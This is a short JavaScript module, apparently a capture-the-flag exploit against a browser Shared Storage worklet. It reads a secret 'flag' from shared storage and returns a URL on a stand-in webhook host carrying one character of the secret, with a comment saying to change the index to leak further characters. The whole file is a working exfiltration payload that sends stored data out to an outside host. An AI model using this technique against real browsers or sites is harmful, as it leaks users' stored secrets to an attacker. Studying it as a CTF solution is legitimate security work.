export async function main(sharedStorage) {
  const charset = 'abcdefghijklmnopqrstuvwxyz{}_0123456789';
  const flagIndex = 0;  // Change this to leak different characters
  const flag = await sharedStorage.get('flag');
  if (!flag) return null;

  const c = flag[flagIndex];
  const urls = charset.split('').map(c => `https://your-webhook.site/?char=${c}`);

  for (const url of urls) {
    if (url.includes('char=' + c)) return url;
  }

  return null;
}
